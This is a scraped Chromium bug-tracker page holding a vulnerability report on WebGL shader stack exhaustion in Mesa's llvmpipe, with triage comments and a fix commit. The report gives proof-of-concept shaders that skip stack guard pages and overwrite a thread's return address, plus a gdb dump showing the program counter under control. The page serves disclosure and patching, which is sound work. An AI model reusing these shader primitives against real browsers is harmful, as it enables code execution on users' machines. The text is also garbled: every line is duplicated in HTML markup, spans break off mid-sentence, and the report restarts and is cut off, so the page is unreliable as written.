        Description #1 by jan.s...@gmail.com (Dec 6, 2020)
      <option value="0" selected="">
        Description #1 by jan.s...@gmail.com (Dec 6, 2020)
      </option>
    
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by jan.s...@gmail.com (Dec 6, 2020)
      </option>
    <!---->
        </select>
      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by jan.s...@gmail.com (Dec 6, 2020)
      </option>
    <!---->
        </select>
      </div>
      # WebGL Shader Stack Exhaustion leading to PC control in llvmpipe<span class="line"><!----># WebGL Shader Stack Exhaustion leading to PC control in llvmpipe<!----></span><br><br>There seem to be a stack exhaustion in ANGLE - Almost Native Graphics Layer Engine.<span class="line"><!---->There seem to be a stack exhaustion in ANGLE - Almost Native Graphics Layer Engine.<!----></span><br>This triggers on the GPU or the CPU if llvmpipe is used.<span class="line"><!---->This triggers on the GPU or the CPU if llvmpipe is used.<!----></span><br># Poc<span class="line"><!----># Poc<!----></span><br><br>See `llvmpipe.ubuntu20.04.write.pc.html`. This has been on a Ubtuntu 20.04 in Virtual Box<span class="line"><!---->See `llvmpipe.ubuntu20.04.write.pc.html`. This has been on a Ubtuntu 20.04 in Virtual Box<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Renderer: ANGLE (VMware, Inc., llvmpipe (LLVM 10.0.0, 256 bits), OpenGL 3.3 core)<span class="line"><!---->Renderer: ANGLE (VMware, Inc., llvmpipe (LLVM 10.0.0, 256 bits), OpenGL 3.3 core)<!----></span><br>Chromium Version: Chromium 87.0.4280.66 snap<span class="line"><!---->Chromium Version: Chromium 87.0.4280.66 snap<!----></span><br>Type of crash: gpu process<span class="line"><!---->Type of crash: gpu process<!----></span><br><br>Crash State:<span class="line"><!---->Crash State:<!----></span><br><br>Thread 3 "llvmpipe-1" received signal SIGSEGV, Segmentation fault.<span class="line"><!---->Thread 3 "llvmpipe-1" received signal SIGSEGV, Segmentation fault.<!----></span><br>[Switching to LWP 2897]<span class="line"><!---->[Switching to LWP 2897]<!----></span><br>[----------------------------------registers-----------------------------------]<span class="line"><!---->[----------------------------------registers-----------------------------------]<!----></span><br>RAX: 0x0 <span class="line"><!---->RAX: 0x0 <!----></span><br>RBX: 0x1800000018 <span class="line"><!---->RBX: 0x1800000018 <!----></span><br>RCX: 0x7fd6624b0e5e (<pthread_barrier_wait+286>:	cmp    rax,0xfffffffffffff000)<span class="line"><!---->RCX: 0x7fd6624b0e5e (&lt;pthread_barrier_wait+286&gt;:	cmp    rax,0xfffffffffffff000)<!----></span><br>RDX: 0x1 <span class="line"><!---->RDX: 0x1 <!----></span><br>RSI: 0x80 <span class="line"><!---->RSI: 0x80 <!----></span><br>RDI: 0x561839f96884 --> 0x4000003cc <span class="line"><!---->RDI: 0x561839f96884 --&gt; 0x4000003cc <!----></span><br>RBP: 0x1900000019 <span class="line"><!---->RBP: 0x1900000019 <!----></span><br>RSP: 0x7fd644229a90 --> 0x434400004344 ('DC')<span class="line"><!---->RSP: 0x7fd644229a90 --&gt; 0x434400004344 ('DC')<!----></span><br>RIP: 0x434445464748 ('HGFEDC')<span class="line"><!---->RIP: 0x434445464748 ('HGFEDC')<!----></span><br>R8 : 0x3c9 <span class="line"><!---->R8 : 0x3c9 <!----></span><br>R9 : 0x561839f96880 --> 0x3cc000003cf <span class="line"><!---->R9 : 0x561839f96880 --&gt; 0x3cc000003cf <!----></span><br>R10: 0x0 <span class="line"><!---->R10: 0x0 <!----></span><br>R11: 0x282 <span class="line"><!---->R11: 0x282 <!----></span><br>R12: 0x1900000019 <span class="line"><!---->R12: 0x1900000019 <!----></span><br>R13: 0x1900000019 <span class="line"><!---->R13: 0x1900000019 <!----></span><br>R14: 0x1900000019 <span class="line"><!---->R14: 0x1900000019 <!----></span><br>R15: 0x434445464748 ('HGFEDC')<span class="line"><!---->R15: 0x434445464748 ('HGFEDC')<!----></span><br>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<span class="line"><!---->EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<!----></span><br>[-------------------------------------code-------------------------------------]<span class="line"><!---->[-------------------------------------code-------------------------------------]<!----></span><br>Invalid $PC address: 0x434445464748<span class="line"><!---->Invalid $PC address: 0x434445464748<!----></span><br>[------------------------------------stack-------------------------------------]<span class="line"><!---->[------------------------------------stack-------------------------------------]<!----></span><br>0000| 0x7fd644229a90 --> 0x434400004344 ('DC')<span class="line"><!---->0000| 0x7fd644229a90 --&gt; 0x434400004344 ('DC')<!----></span><br>0008| 0x7fd644229a98 --> 0x434400004344 ('DC')<span class="line"><!---->0008| 0x7fd644229a98 --&gt; 0x434400004344 ('DC')<!----></span><br>0016| 0x7fd644229aa0 --> 0x1b0000001b <span class="line"><!---->0016| 0x7fd644229aa0 --&gt; 0x1b0000001b <!----></span><br>0024| 0x7fd644229aa8 --> 0x1b0000001b <span class="line"><!---->0024| 0x7fd644229aa8 --&gt; 0x1b0000001b <!----></span><br>0032| 0x7fd644229ab0 --> 0x1b0000001b <span class="line"><!---->0032| 0x7fd644229ab0 --&gt; 0x1b0000001b <!----></span><br>0040| 0x7fd644229ab8 --> 0x1b0000001b <span class="line"><!---->0040| 0x7fd644229ab8 --&gt; 0x1b0000001b <!----></span><br>0048| 0x7fd644229ac0 --> 0x1c0000001c <span class="line"><!---->0048| 0x7fd644229ac0 --&gt; 0x1c0000001c <!----></span><br>0056| 0x7fd644229ac8 --> 0x1c0000001c <span class="line"><!---->0056| 0x7fd644229ac8 --&gt; 0x1c0000001c <!----></span><br>[------------------------------------------------------------------------------]<span class="line"><!---->[------------------------------------------------------------------------------]<!----></span><br>Legend: code, data, rodata, value<span class="line"><!---->Legend: code, data, rodata, value<!----></span><br>Stopped reason: SIGSEGV<span class="line"><!---->Stopped reason: SIGSEGV<!----></span><br>0x0000434445464748 in ?? ()<span class="line"><!---->0x0000434445464748 in ?? ()<!----></span><br>gdb-peda$ bt<span class="line"><!---->gdb-peda$ bt<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br># Bug<span class="line"><!----># Bug<!----></span><br><br>We can define arrays inside a shader and make them quite large.<span class="line"><!---->We can define arrays inside a shader and make them quite large.<!----></span><br>Those are allocated on the stack, regardless of the stack size of the computing engine.<span class="line"><!---->Those are allocated on the stack, regardless of the stack size of the computing engine.<!----></span><br>Therefore, we have a giant "sub $rsp, xxx" in the beginning of the shader function.<span class="line"><!---->Therefore, we have a giant "sub $rsp, xxx" in the beginning of the shader function.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>    precision mediump float;<span class="line"><!---->    precision mediump float;<!----></span><br>    vec4 x[42000000]; //Allocate lots of memory<span class="line"><!---->    vec4 x[42000000]; //Allocate lots of memory<!----></span><br>    int i;<span class="line"><!---->    int i;<!----></span><br><br>    varying vec4 vColor;<span class="line"><!---->    varying vec4 vColor;<!----></span><br>    void main(void) {<span class="line"><!---->    void main(void) {<!----></span><br>        gl_FragColor = x[42]; //used so x is not optimized out<span class="line"><!---->        gl_FragColor = x[42]; //used so x is not optimized out<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>The shader language has some important limitations:<span class="line"><!---->The shader language has some important limitations:<!----></span><br> - Recursive shader functions are not allowed.<span class="line"><!----> - Recursive shader functions are not allowed.<!----></span><br> - Array indices must be constant.<span class="line"><!----> - Array indices must be constant.<!----></span><br> - Small arrays (<16 elements or so) might be optimized out.<span class="line"><!----> - Small arrays (&lt;16 elements or so) might be optimized out.<!----></span><br> - Functions, that are called once will be inlined<span class="line"><!----> - Functions, that are called once will be inlined<!----></span><br> - Everything, that is not needed is optimized out.<span class="line"><!----> - Everything, that is not needed is optimized out.<!----></span><br><br>Shaderlanguage is defined [here](<span class="line"><!---->Shaderlanguage is defined [here](<!----></span>https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf<a class="undefined" target="_blank" href="https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf"><!---->https://www.khronos.org/registry/OpenGL/specs/gl/GLSLangSpec.4.10.pdf<!----></a>)<span class="line"><!---->)<!----></span><br><br><br># llvmpipe<span class="line"><!----># llvmpipe<!----></span><br><br>The LLVM Pipe driver is used on Linux if no graphics card is available and is part of mesa.<span class="line"><!---->The LLVM Pipe driver is used on Linux if no graphics card is available and is part of mesa.<!----></span><br>TLDR: We have PC control but no leak<span class="line"><!---->TLDR: We have PC control but no leak<!----></span><br><br>Each core has its own thread for executing shaders.<span class="line"><!---->Each core has its own thread for executing shaders.<!----></span><br>Triggereing the bug here allows us to jump into the stack frame of the next process.<span class="line"><!---->Triggereing the bug here allows us to jump into the stack frame of the next process.<!----></span><br>Stacks are separated with guard pages, a 4096 byte region, that is not readable, writable or executable.<span class="line"><!---->Stacks are separated with guard pages, a 4096 byte region, that is not readable, writable or executable.<!----></span><br>Those can be skipped usig the following code:<span class="line"><!---->Those can be skipped usig the following code:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>int x[0x00080];<span class="line"><!---->int x[0x00080];<!----></span><br>void main(void) {<span class="line"><!---->void main(void) {<!----></span><br>  gl_FragColor = vec4(float(x[0]); //required so x is not optimzed out<span class="line"><!---->  gl_FragColor = vec4(float(x[0]); //required so x is not optimzed out<!----></span><br><br>  // Here we allocate memory, without writing to it<span class="line"><!---->  // Here we allocate memory, without writing to it<!----></span><br>  if (int(x[0]) == 42) {<span class="line"><!---->  if (int(x[0]) == 42) {<!----></span><br>    int pad[0x40000];<span class="line"><!---->    int pad[0x40000];<!----></span><br>    gl_FragColor += vec4(float(pad[42]));<span class="line"><!---->    gl_FragColor += vec4(float(pad[42]));<!----></span><br>  }<span class="line"><!---->  }<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>This will translate to the following code:<span class="line"><!---->This will translate to the following code:<!----></span><br><br><br>```<span class="line"><!---->```<!----></span><br>void initGlobals();<span class="line"><!---->void initGlobals();<!----></span><br>varying mediump float webgl_51cdbba1f77a8b72;<span class="line"><!---->varying mediump float webgl_51cdbba1f77a8b72;<!----></span><br>mediump int webgl_4fc82888d13de398[128];<span class="line"><!---->mediump int webgl_4fc82888d13de398[128];<!----></span><br>void main(){<span class="line"><!---->void main(){<!----></span><br>    initGlobals();<span class="line"><!---->    initGlobals();<!----></span><br>    (gl_FragColor = vec4(float(webgl_4fc82888d13de398[0])));<span class="line"><!---->    (gl_FragColor = vec4(float(webgl_4fc82888d13de398[0])));<!----></span><br><br>    if ((int(webgl_4fc82888d13de398[0]) == 42)) {<span class="line"><!---->    if ((int(webgl_4fc82888d13de398[0]) == 42)) {<!----></span><br>        mediump int webgl_b84b23e845ea3eb[262144];<span class="line"><!---->        mediump int webgl_b84b23e845ea3eb[262144];<!----></span><br>        for (highp int s920 = 0; (s920 < 262144); (++s920)) {<span class="line"><!---->        for (highp int s920 = 0; (s920 &lt; 262144); (++s920)) {<!----></span><br>            (webgl_b84b23e845ea3eb[s920] = 0);<span class="line"><!---->            (webgl_b84b23e845ea3eb[s920] = 0);<!----></span><br>        }<span class="line"><!---->        }<!----></span><br>        (gl_FragColor += vec4(float(webgl_b84b23e845ea3eb[42])));<span class="line"><!---->        (gl_FragColor += vec4(float(webgl_b84b23e845ea3eb[42])));<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>}<span class="line"><!---->}<!----></span><br>void initGlobals(){<span class="line"><!---->void initGlobals(){<!----></span><br>    for (highp int s91e = 0; (s91e < 128); (++s91e)) {<span class="line"><!---->    for (highp int s91e = 0; (s91e &lt; 128); (++s91e)) {<!----></span><br>        (webgl_4fc82888d13de398[s91e] = 0);<span class="line"><!---->        (webgl_4fc82888d13de398[s91e] = 0);<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>Not that pad is declared and initialized within the consequent of the if statement.<span class="line"><!---->Not that pad is declared and initialized within the consequent of the if statement.<!----></span><br>As the expression is always false, the initialization is never executed.<span class="line"><!---->As the expression is always false, the initialization is never executed.<!----></span><br>However the stack frame is allocated on function entry and not modified within a code block.<span class="line"><!---->However the stack frame is allocated on function entry and not modified within a code block.<!----></span><br>Therefore, we can allocate memory without writing to it and skip guard pages.<span class="line"><!---->Therefore, we can allocate memory without writing to it and skip guard pages.<!----></span><br><br><br>By tuning the offsets, we an directly overwrite the return address of a llvmpipe thread.<span class="line"><!---->By tuning the offsets, we an directly overwrite the return address of a llvmpipe thread.<!----></span><br>One thing to note is, that 8 pixels are computed per thread.<span class="line"><!---->One thing to note is, that 8 pixels are computed per thread.<!----></span><br>Therefore allocates each 32-bit int 32 bytes in memory.<span class="line"><!---->Therefore allocates each 32-bit int 32 bytes in memory.<!----></span><br>To control the upper and lower half of a 64-bit address, we have to put different values insinde the array for two pixels.<span class="line"><!---->To control the upper and lower half of a 64-bit address, we have to put different values insinde the array for two pixels.<!----></span><br>One way to accomplish this is to use varying variables.<span class="line"><!---->One way to accomplish this is to use varying variables.<!----></span><br><br><br>```<span class="line"><!---->```<!----></span><br>varying float floatVar;<span class="line"><!---->varying float floatVar;<!----></span><br><br>[...]<span class="line"><!---->[...]<!----></span><br>    if(floatVar > 0.) <span class="line"><!---->    if(floatVar &gt; 0.) <!----></span><br>      x[0x1a] = 0x4344;<span class="line"><!---->      x[0x1a] = 0x4344;<!----></span><br>    else<span class="line"><!---->    else<!----></span><br>      x[0x1a] = 0x45464748;<span class="line"><!---->      x[0x1a] = 0x45464748;<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>There are no stack-canaries within the llvmpipe threads<span class="line"><!---->There are no stack-canaries within the llvmpipe threads<!----></span><br><br># Leak<span class="line"><!----># Leak<!----></span><br><br>I do not see a trivial way to convert this bug into a leak right now.<span class="line"><!---->I do not see a trivial way to convert this bug into a leak right now.<!----></span><br>As we want to leak pointers, we also have the chance of overwriting them, resulting in a crash.<span class="line"><!---->As we want to leak pointers, we also have the chance of overwriting them, resulting in a crash.<!----></span><br>This makes exploitation possibly unreliable.<span class="line"><!---->This makes exploitation possibly unreliable.<!----></span><mr-comment-content></mr-comment-content>

        ClusterFuzz is analyzing your testcase. Developers can follow the progress at <span class="line"><!---->ClusterFuzz is analyzing your testcase.         Hi,<span class="line"><!---->Hi,<!----></span><br>I saw that clusterfuzz failed to reproduce the testcase. It seems that swift shader is used instead of llvmpipe due to the added option ``--use-gl=angle --use-angle=swiftshader``. The google swift shader is not affected and the compilation of the buggy shader is fails with ``Array size of (xxx) exceeds limit of gl_MaxFragmentUniformVectors(261)``. The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<span class="line"><!---->I saw that clusterfuzz failed to reproduce the testcase. It seems that swift shader is used instead of llvmpipe due to the added option ``--use-gl=angle --use-angle=swiftshader``. The google swift shader is not affected and the compilation of the buggy shader is fails with ``Array size of (xxx) exceeds limit of gl_MaxFragmentUniformVectors(261)``. The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<!----></span><br><br>An other common ground I could identify is:<span class="line"><!---->An other common ground I could identify is:<!----></span><br>Affected: GL_VERSION = OpenGL ES x.y.z<span class="line"><!---->Affected: GL_VERSION = OpenGL ES x.y.z<!----></span><br>Not Affected: GL_VERSION = OpenGL ES x.y.z SwiftShader a.b.c<span class="line"><!---->Not Affected: GL_VERSION = OpenGL ES x.y.z SwiftShader a.b.c<!----></span><br><br>On a Pixel4 with Android 11 the shader also compiles indicating a missing check. However the bug triggers on the GPU leading to strange behavior (In some cases system UI freeze/crash) and no PC control.<span class="line"><!---->On a Pixel4 with Android 11 the shader also compiles indicating a missing check. However the bug triggers on the GPU leading to strange behavior (In some cases system UI freeze/crash) and no PC control.<!----></span><br><br>If this bug is not within the chrome project and can pinpoint the affected project please let me know.<span class="line"><!---->If this bug is not within the chrome project and can pinpoint the affected project please let me know.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&alt=media<a class="undefined" target="_blank" href="https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&amp;alt=media"><!---->https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&amp;alt=media<!----></a><mr-comment-content></mr-comment-content>

        Any system with Mesa (i.e. pretty much all Linux systems) should have llvmpipe available as a fallback. A quick search shows that the way to do this nowadays is to set:<span class="line"><!---->Any system with Mesa (i.e. pretty much all Linux systems) should have llvmpipe available as a fallback. A quick search shows that the way to do this nowadays is to set:<!----></span><br><br>LIBGL_ALWAYS_SOFTWARE=1<span class="line"><!---->LIBGL_ALWAYS_SOFTWARE=1<!----></span><br>GALLIUM_DRIVER=llvmpipe<span class="line"><!---->GALLIUM_DRIVER=llvmpipe<!----></span><br><br>https://docs.mesa3d.org/envvars.html<a class="undefined" target="_blank" href="https://docs.mesa3d.org/envvars.html"><!---->https://docs.mesa3d.org/envvars.html<!----></a><br>(I seem to remember it used to be a bit harder, had to set some LD variables, but that probably isn't necessary anymore.)<span class="line"><!---->(I seem to remember it used to be a bit harder, had to set some LD variables, but that probably isn't necessary anymore.)<!----></span><br><br>In Chromium you might also need --ignore-gpu-blocklist if Chromium blocklists llvmpipe. I'm not sure whether we do - on a cursory inspection, I only see an entry for a very old version of Mesa, so we may not blocklist it.<span class="line"><!---->In Chromium you might also need --ignore-gpu-blocklist if Chromium blocklists llvmpipe. I'm not sure whether we do - on a cursory inspection, I only see an entry for a very old version of Mesa, so we may not blocklist it.<!----></span><br>https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json"><!---->https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json<!----></a><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        > The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<span class="line"><!---->&gt; The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<!----></span><br><br>llvmpipe is not an ANGLE backend, so you can't do --use-angle=llvmpipe. llvmpipe is part of Mesa, which is system software.<span class="line"><!---->llvmpipe is not an ANGLE backend, so you can't do --use-angle=llvmpipe. llvmpipe is part of Mesa, which is system software.<!----></span><mr-comment-content></mr-comment-content>

        > Is it known whether this is a recent regression in Mesa that would imply a more narrow blocklist entry?<span class="line"><!---->&gt; Is it known whether this is a recent regression in Mesa that would imply a more narrow blocklist entry?<!----></span><br><br>Do we want a more narrow blocklist entry? I thought we would prefer to rely on our own (domain specific, so hopefully more efficient) software paths, at least for everything other than WebGL. And for WebGL, SwiftShader avoids unknown factors like llvmpipe (or swrast?)<span class="line"><!---->Do we want a more narrow blocklist entry? I thought we would prefer to rely on our own (domain specific, so hopefully more efficient) software paths, at least for everything other than WebGL. And for WebGL, SwiftShader avoids unknown factors like llvmpipe (or swrast?)<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

        The following revision refers to this bug:<span class="line"><!---->The following revision refers to this bug:<!----></span><br>  <span class="line"><!---->  <!----></span>https://chromium.googlesource.com/chromium/src/+/62bda83979fb5cd663e86706ebf8ee05a28c91c9<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromium/src/+/62bda83979fb5cd663e86706ebf8ee05a28c91c9"><!---->https://chromium.googlesource.com/chromium/src/+/62bda83979fb5cd663e86706ebf8ee05a28c91c9<!----></a><br><br>commit <span class="line"><!---->commit <!----></span>62bda83979fb5cd663e86706ebf8ee05a28c91c9<a class="undefined" target="_blank" href="https://crrev.com/62bda83979fb5cd663e86706ebf8ee05a28c91c9"><!---->62bda83979fb5cd663e86706ebf8ee05a28c91c9<!----></a><br>Author: Kai Ninomiya <<span class="line"><!---->Author: Kai Ninomiya &lt;<!----></span>kainino@chromium.org<a class="undefined" target="_blank" href="/u/kainino@chromium.org"><!---->kainino@chromium.org<!----></a>><span class="line"><!---->&gt;<!----></span><br>Date: Thu Feb 11 02:24:04 2021<span class="line"><!---->Date: Thu Feb 11 02:24:04 2021<!----></span><br><br>Disable GPU acceleration on all Mesa software rasterizers<span class="line"><!---->Disable GPU acceleration on all Mesa software rasterizers<!----></span><br><br>The previous entry only disabled acceleration on swrast, but softpipe<span class="line"><!---->The previous entry only disabled acceleration on swrast, but softpipe<!----></span><br>and llvmpipe shouldn't be used for "GPU" acceleration either.<span class="line"><!---->and llvmpipe shouldn't be used for "GPU" acceleration either.<!----></span><br>This should apply to Linux but not ChromeOS, AFAICT.<span class="line"><!---->This should apply to Linux but not ChromeOS, AFAICT.<!----></span><br><br>This only improves an existing software rendering list entry, but here<span class="line"><!---->This only improves an existing software rendering list entry, but here<!----></span><br>is the rationale: We prefer to rely on our own (domain specific, so more<span class="line"><!---->is the rationale: We prefer to rely on our own (domain specific, so more<!----></span><br>efficient) software paths, at least for everything other than WebGL. And<span class="line"><!---->efficient) software paths, at least for everything other than WebGL. And<!----></span><br>for WebGL, SwiftShader avoids unknown factors like<span class="line"><!---->for WebGL, SwiftShader avoids unknown factors like<!----></span><br>llvmpipe/softpipe/swrast.<span class="line"><!---->llvmpipe/softpipe/swrast.<!----></span><br><br>If you are running a Mesa GL driver (not e.g. NVIDIA) then you can force<span class="line"><!---->If you are running a Mesa GL driver (not e.g. NVIDIA) then you can force<!----></span><br>these configurations with:<span class="line"><!---->these configurations with:<!----></span><br>- LIBGL_ALWAYS_SOFTWARE=1<span GALLIUM_DRIVER=llvmpipe, softpipe, or swr (though swr didn't work for me)<span class="line"><!---->- GALLIUM_DRIVER=llvmpipe, softpipe, or swr (though swr didn't work for me)<!----></span><br>  <span GL_RENDERER strings are:<span class="line"><!---->The GL_RENDERER strings are:<!----></span><br>- swrast: "Software Rasterizer" (couldn't test this locally; found this online)<span machine)<!----></span><br><br>Drive-by updates the description of another item to be more accurate<span class="line"><!---->Drive-by updates the description of another item to be more accurate<!----></span><br>(SVGA3D is virtualized over hardware; it's not a software renderer).<span class="line"><!---->(SVGA3D is virtualized over hardware; it's not a software       # WebGL Shader Stack Exhaustion leading to PC control in llvmpipe<span class="line"><!----># WebGL Shader Stack Exhaustion leading to PC control in llvmpipe<!----></span><br><br>There seem to be a stack exhaustion in ANGLE - Almost Native Graphics Layer Engine.<span class="line"><!---->There seem to be a stack exhaustion in ANGLE - Almost Native Graphics Layer Engine.<!----></span><br>This triggers on the GPU or the CPU if llvmpipe is used.<span class="line"><!---->This triggers on the GPU or the CPU if llvmpipe is used.<!----></span><br># Poc<span class="line"><!----># Poc<!----></span><br><br>See `llvmpipe.ubuntu20.04.write.pc.html`. This has been on a Ubtuntu 20.04 in Virtual Box<span class="line"><!---->See `llvmpipe.ubuntu20.04.write.pc.html`. This has been on a Ubtuntu 20.04 in Virtual Box<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Renderer: ANGLE (VMware, Inc., llvmpipe (LLVM 10.0.0, 256 bits), OpenGL 3.3 core)<span class="line"><!---->Renderer: ANGLE (VMware, Inc., llvmpipe (LLVM 10.0.0, 256 bits), OpenGL 3.3 core)<!----></span><br>Chromium Version: Chromium 87.0.4280.66 snap<span class="line"><!---->Chromium Version: Chromium 87.0.4280.66 snap<!----></span><br>Type of crash: gpu process<span class="line"><!---->Type of crash: gpu process<!----></span><br><br>Crash State:<span class="line"><!---->Crash State:<!----></span><br><br>Thread 3 "llvmpipe-1" received signal SIGSEGV, Segmentation fault.<span class="line"><!---->Thread 3 "llvmpipe-1" received signal SIGSEGV, Segmentation fault.<!----></span><br>[Switching to LWP 2897]<span class="line"><!---->[Switching to LWP 2897]<!----></span><br>[----------------------------------registers-----------------------------------]<span class="line"><!---->[----------------------------------registers-----------------------------------]<!----></span><br>RAX: 0x0 <span class="line"><!---->RAX: 0x0 <!----></span><br>RBX: 0x1800000018 <span class="line"><!---->RBX: 0x1800000018 <!----></span><br>RCX: 0x7fd6624b0e5e (<pthread_barrier_wait+286>:	cmp    rax,0xfffffffffffff000)<span class="line"><!---->RCX: 0x7fd6624b0e5e (&lt;pthread_barrier_wait+286&gt;:	cmp    rax,0xfffffffffffff000)<!----></span><br>RDX: 0x1 <span class="line"><!---->RDX: 0x1 <!----></span><br>RSI: 0x80 <span class="line"><!---->RSI: 0x80 <!----></span><br>RDI: 0x561839f96884 --> 0x4000003cc <span class="line"><!---->RDI: 0x561839f96884 --&gt; 0x4000003cc <!----></span><br>RBP: 0x1900000019 <span class="line"><!---->RBP: 0x1900000019 <!----></span><br>RSP: 0x7fd644229a90 --> 0x434400004344 ('DC')<span class="line"><!---->RSP: 0x7fd644229a90 --&gt; 0x434400004344 ('DC')<!----></span><br>RIP: 0x434445464748 ('HGFEDC')<span class="line"><!---->RIP: 0x434445464748 ('HGFEDC')<!----></span><br>R8 : 0x3c9 <span class="line"><!---->R8 : 0x3c9 <!----></span><br>R9 : 0x561839f96880 --> 0x3cc000003cf <span class="line"><!---->R9 : 0x561839f96880 --&gt; 0x3cc000003cf <!----></span><br>R10: 0x0 <span class="line"><!---->R10: 0x0 <!----></span><br>R11: 0x282 <span class="line"><!---->R11: 0x282 <!----></span><br>R12: 0x1900000019 <span class="line"><!---->R12: 0x1900000019 <!----></span><br>R13: 0x1900000019 <span class="line"><!---->R13: 0x1900000019 <!----></span><br>R14: 0x1900000019 <span class="line"><!---->R14: 0x1900000019 <!----></span><br>R15: 0x434445464748 ('HGFEDC')<span class="line"><!---->R15: 0x434445464748 ('HGFEDC')<!----></span><br>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<span class="line"><!---->EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<!----></span><br>[-------------------------------------code-------------------------------------]<span class="line"><!---->[-------------------------------------code-------------------------------------]<!----></span><br>Invalid $PC address: 0x434445464748<span class="line"><!---->Invalid $PC address: 0x434445464748<!----></span><br>[------------------------------------stack-------------------------------------]<span class="line"><!---->[------------------------------------stack-------------------------------------]<!----></span><br>0000| 0x7fd644229a90 --> 0x434400004344 ('DC')<span class="line"><!---->0000| 0x7fd644229a90 --&gt; 0x434400004344 ('DC')<!----></span><br>0008| 0x7fd644229a98 --> 0x434400004344 ('DC')<span class="line"><!---->0008| 0x7fd644229a98 --&gt; 0x434400004344 ('DC')<!----></span><br>0016| 0x7fd644229aa0 --> 0x1b0000001b <span class="line"><!---->0016| 0x7fd644229aa0 --&gt; 0x1b0000001b <!----></span><br>0024| 0x7fd644229aa8 --> 0x1b0000001b <span class="line"><!---->0024| 0x7fd644229aa8 --&gt; 0x1b0000001b <!----></span><br>0032| 0x7fd644229ab0 --> 0x1b0000001b <span class="line"><!---->0032| 0x7fd644229ab0 --&gt; 0x1b0000001b <!----></span><br>0040| 0x7fd644229ab8 --> 0x1b0000001b <span class="line"><!---->0040| 0x7fd644229ab8 --&gt; 0x1b0000001b <!----></span><br>0048| 0x7fd644229ac0 --> 0x1c0000001c <span class="line"><!---->0048| 0x7fd644229ac0 --&gt; 0x1c0000001c <!----></span><br>0056| 0x7fd644229ac8 --> 0x1c0000001c <span class="line"><!---->0056| 0x7fd644229ac8 --&gt; 0x1c0000001c <!----></span><br>[------------------------------------------------------------------------------]<span class="line"><!---->[------------------------------------------------------------------------------]<!----></span><br>Legend: code, data, rodata, value<span class="line"><!---->Legend: code, data, rodata, value<!----></span><br>Stopped reason: SIGSEGV<span class="line"><!---->Stopped reason: SIGSEGV<!----></span><br>0x0000434445464748 in ?? ()<span class="line"><!---->0x0000434445464748 in 